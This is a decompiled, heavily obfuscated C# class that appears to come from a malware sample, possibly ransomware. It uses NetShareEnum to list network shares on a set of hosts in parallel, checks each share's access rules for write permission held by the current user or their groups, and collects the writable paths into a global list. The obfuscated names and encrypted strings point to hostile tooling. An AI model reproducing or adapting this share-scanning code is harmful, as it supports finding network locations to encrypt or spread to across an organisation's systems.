using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HSFBHZCtMXjPES;

internal sealed class EXeBTyzMsDI
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct nzVqkejIHetE
	{
		public string EItSFfAPPoxFh;

		public uint ZYUImpcTwrMrJ;

		public string uZqyfNknoLfxS;

		public nzVqkejIHetE(string string_0, uint uint_0, string string_1)
		{
			EItSFfAPPoxFh = string_0;
			ZYUImpcTwrMrJ = uint_0;
			uZqyfNknoLfxS = string_1;
		}

		public override string ToString()
		{
			return EItSFfAPPoxFh;
		}
	}

	private sealed class YhodfQLqqcKdp
	{
		public rLuxmxvwlZQom.rdUxlcrLRAL BvCpDiYduROH;
	}

	private sealed class rLbRrcrjFpNGD
	{
		public YhodfQLqqcKdp AeMhZJspzKyLn;

		public string GBJLssNuknBe;

		public void _003CGetAllShares_003Eb__1()
		{
			QrNYdqaoVdxPe(GBJLssNuknBe, AeMhZJspzKyLn.BvCpDiYduROH);
		}
	}

	public static ReaderWriterLockSlim CYUhtmAKckZ;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static nzVqkejIHetE[] JwaFsUBapOHv(string string_0)
	{
		List<nzVqkejIHetE> list = new List<nzVqkejIHetE>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(nzVqkejIHetE));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				nzVqkejIHetE item = (nzVqkejIHetE)Marshal.PtrToStructure(ptr, typeof(nzVqkejIHetE));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new nzVqkejIHetE(getString_0(107362651) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static void QrNYdqaoVdxPe(string string_0, rLuxmxvwlZQom.rdUxlcrLRAL rdUxlcrLRAL_0)
	{
		string[] source = new string[2]
		{
			getString_0(107362674),
			getString_0(107362629)
		};
		nzVqkejIHetE[] array = JwaFsUBapOHv(string_0);
		if (array.Length > 0)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string value = current.User!.Value;
			nzVqkejIHetE[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				nzVqkejIHetE nzVqkejIHetE = array2[i];
				if (rdUxlcrLRAL_0.AnsdRDnoiUICV != null && rdUxlcrLRAL_0.AnsdRDnoiUICV.Contains(nzVqkejIHetE.EItSFfAPPoxFh.ToString().ToUpper()))
				{
					continue;
				}
				try
				{
					string text = string.Format(getString_0(107362648), string_0, nzVqkejIHetE.EItSFfAPPoxFh);
					Directory.GetFiles(text);
					list.Add(nzVqkejIHetE.EItSFfAPPoxFh);
					AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
					foreach (FileSystemAccessRule item in accessRules)
					{
						if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
						{
							if (!UzNyTypkvLt.UnsVNkGvmiq.Contains(text))
							{
								UzNyTypkvLt.UnsVNkGvmiq.Add(text);
							}
							list2.Add(nzVqkejIHetE.EItSFfAPPoxFh);
							break;
						}
					}
				}
				catch
				{
					if (!source.Contains(nzVqkejIHetE.EItSFfAPPoxFh))
					{
						list3.Add(nzVqkejIHetE.EItSFfAPPoxFh);
					}
				}
			}
		}
		AHwMQPqVfGqQS.GcOMUgOJULFD++;
	}

	public static void eqxTahWunGJs(List<string> list_0, rLuxmxvwlZQom.rdUxlcrLRAL rdUxlcrLRAL_0)
	{
		YhodfQLqqcKdp yhodfQLqqcKdp = new YhodfQLqqcKdp();
		yhodfQLqqcKdp.BvCpDiYduROH = rdUxlcrLRAL_0;
		List<Action> list = new List<Action>();
		using (List<string>.Enumerator enumerator = list_0.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Action action = null;
				rLbRrcrjFpNGD CS_0024_003C_003E8__locals0 = new rLbRrcrjFpNGD();
				CS_0024_003C_003E8__locals0.AeMhZJspzKyLn = yhodfQLqqcKdp;
				CS_0024_003C_003E8__locals0.GBJLssNuknBe = enumerator.Current;
				action = delegate
				{
					QrNYdqaoVdxPe(CS_0024_003C_003E8__locals0.GBJLssNuknBe, CS_0024_003C_003E8__locals0.AeMhZJspzKyLn.BvCpDiYduROH);
				};
				list.Add(action);
			}
		}
		ParallelOptions parallelOptions = new ParallelOptions();
		parallelOptions.MaxDegreeOfParallelism = yhodfQLqqcKdp.BvCpDiYduROH.TzpVQGJqGeVIiRK;
		ParallelOptions parallelOptions2 = parallelOptions;
		Parallel.Invoke(parallelOptions2, list.ToArray());
	}

	static EXeBTyzMsDI()
	{
		Strings.CreateGetStringDelegate(typeof(EXeBTyzMsDI));
		CYUhtmAKckZ = new ReaderWriterLockSlim();
	}
}
